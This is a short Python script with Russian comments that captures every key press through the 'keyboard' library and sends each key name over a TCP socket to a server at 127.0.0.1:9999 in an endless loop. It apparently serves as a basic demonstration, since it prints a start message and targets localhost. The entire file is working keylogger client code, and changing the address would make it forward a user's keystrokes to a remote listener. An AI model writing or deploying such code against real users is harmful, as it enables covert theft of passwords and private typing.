import socket
import keyboard  # Нужно установить библиотеку "keyboard" для захвата нажатий

def start_client():
    # Подключаемся к серверу
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('127.0.0.1', 9999))  # Подключаемся к локальному серверу

    print("Клиент запущен. Нажимайте клавиши...")

    while True:
        # Ждем нажатие клавиши
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:  # Захватываем событие нажатия
            key = event.name  # Получаем название клавиши
            client_socket.send(key.encode('utf-8'))  # Отправляем клавишу на сервер

if __name__ == "__main__":
    start_client()
